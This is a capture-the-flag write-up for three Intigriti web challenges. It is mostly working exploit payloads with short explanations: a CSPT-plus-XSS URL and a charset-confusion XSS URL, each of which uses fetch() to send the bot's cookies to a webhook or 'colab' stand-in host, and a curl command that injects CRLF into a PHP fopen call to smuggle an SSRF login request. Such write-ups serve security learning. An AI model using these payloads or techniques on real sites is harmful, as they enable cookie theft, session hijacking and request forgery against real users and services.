## Safe Notes 2
#xss #cspt
### Exploitaton
1. Create a note with the following content:
`<span id="username"></span><div id="debug-content-section" style="display:none;" class="note-panel"><h3>Debug Information</h3><div id="debug-content" class="note-content"></div></div>`
That will:
- Make the javascript in `view.html` take the username from the URL parameter.
- Add the debug elements to the DOM.
3. Send to the bot the following URL:
``https://<CHALL_URL>/view?name=....//....//....//contact%23%3Cimg%20src=x%20onerror=fetch(`https://<WEBHOOK>/`%2bdocument.cookie)%20/%3E&note=<NOTE_UUID>``
With our created note UUID and our webhook to:
- Trigger the CSPT to make a call to `/contact`.
- Make the javascript reflect our username to the page.
- Trigger XSS and leak the cookie.
## Greetings
#ssrf #crlf #hrs 
### Code review
```php
<?php
if(isset($_POST['hello']))
{
    session_start();
    $_SESSION = $_POST;
    if(!empty($_SESSION['name']))
    {
        $name = $_SESSION['name'];
        $protocol = (isset($_SESSION['protocol']) && !preg_match('/http|file/i', $_SESSION['protocol'])) ? $_SESSION['protocol'] : null;
        $options = (isset($_SESSION['options']) && !preg_match('/http|file|\\\/i', $_SESSION['options'])) ? $_SESSION['options'] : null;
        
        try {
            if(isset($options) && isset($protocol))
            {
                $context = stream_context_create(json_decode($options, true));
                $resp = @fopen("$protocol://127.0.0.1:3000/$name", 'r', false, $context);
            }
            else
            {
                $resp = @fopen("http://127.0.0.1:3000/$name", 'r', false);
            }

            if($resp)
            {
                $content = stream_get_contents($resp);
                echo "<div class='greeting-output'>" . htmlspecialchars($content) . "</div>";
                fclose($resp);
            }
            else
            {
                throw new Exception("Unable to connect to the service.");
            }
        } catch (Exception $e) {
            error_log("Error: " . $e->getMessage());
            
            echo "<div class='greeting-output error'>Something went wrong!</div>";
        }
    }
}
?>
```
### Exploitation
- Fopen is vulnerable to crlf injection
- We can specify a protocol and the options -> use `127.0.0.1:5000` as proxy

```
curl -X POST https://greetings.ctf.intigriti.io/ -d "protocol=ftp&options=%7B%22ftp%22%3A%20%7B%22proxy%22%3A%20%22127.0.0.1%3A5000%22%7D%7D&hello=world&name=flag%20HTTP/1.1%0d%0aHost:%20127.0.0.1:5000%0d%0aPassword:%20admin%0d%0aContent-Type:%20application%2Fx-www-form-urlencoded%0d%0aContent-Length:%2014%0d%0a%0d%0ausername%3dadmin" -vvv
```
## Sushi Search
#xss #charset 
### Overiew
Simple website that allows to search about sushi items.
There's an headless bot that opens reported urls
### Road to flag
The flag is inside bot's cookies -> XSS
### Code review
The code is really simple:
```js
fastify.get("/search", async (req, reply) => {
    const query = req.query.search || "";

    const matchedItems = items.filter(
        (item) =>
            item.title.toLowerCase().includes(query.toLowerCase()) ||
            item.description.toLowerCase().includes(query.toLowerCase())
    );

    const window = new JSDOM("").window;
    const DOMPurify = createDOMPurify(window);
    const cleanQuery = DOMPurify.sanitize(query);

    const resp = await ejs.renderFile(path.resolve(__dirname, "views", "result.ejs"), {
        message: cleanQuery,
        items: matchedItems,
    });
    reply.type("text/html").send(resp);
});
```
### Exploit
- The response doesn't specify the page's charset -> xss via different charset

```
https://sushisearch.ctf.intigriti.io/search?search=%3Ca%20id=%22%1b$B%22%3E%3C/a%3E%1b(B%3Ca%20id=%22%1b$B%22%3E%3C/a%3E%1b(B%3Ca%20id=%22%1b$B%22%3E%3C/a%3E%1b(B%3Ca%20id=%22%1b$B%22%3E%3C/a%3E%1b(B%3Ca%20id=%22%1b$B%22%3E%3C/a%3E%1b(B%3Ca%20id=%22%1b$B%22%3E%3C/a%3E%1b(B%3Ca%20id=%22%1b$B%22%3E%3C/a%3E%1b(B%3Ca%20id=%22%1b$B%22%3E%3C/a%3E%1b(B%3Ca%20id=%22%1b$B%22%3E%3C/a%3E%1b(B%3Ca%20id=%22%1b$B%22%3E%3C/a%3E%1b(B%3Ca%20id=%22%1b$B%22%3E%3C/a%3E%1b(B%3Ca%20id=%22%1b$B%22%3E%3C/a%3E%1b(B%3Ca%20id=%22%1b$B%22%3E%3C/a%3E%1b(B%3Ca%20id=%22%1b$B%22%3E%3C/a%3E%1b(B%3Ca%20id=%22%1b$B%22%3E%3C/a%3E%1b(B%3Ca%20id=%22%1b$B%22%3E%3C/a%3E%1b(B%3Ca%20id=%22%1b$B%22%3E%3C/a%3E%1b(B%3Ca%20id=%22%1b$B%22%3E%3C/a%3E%1b(B%3Ca%20id=%22%1b$B%22%3E%3C/a%3E%1b(B%3Ca%20id=%22%1b$B%22%3E%3C/a%3E%1b(B%3Ca%20id=%22%1b$B%22%3E%3C/a%3E%1b(B%3Ca%20id=%22%1b$B%22%3E%3C/a%3E%1b(B%3Ca%20id=%22%1b$B%22%3E%3C/a%3E%1b(B%3Ca%20id=%22%1b$B%22%3E%3C/a%3E%1b(B%3Ca%20id=%22%1b$B%22%3E%3C/a%3E%1b(B%3Ca%20id=%22%3E%3Cimg%20src=x%20onerror=fetch(%27https://colab/?x=%27%2bdocument.cookie)%3E%22%3E%3C/a%3E
```
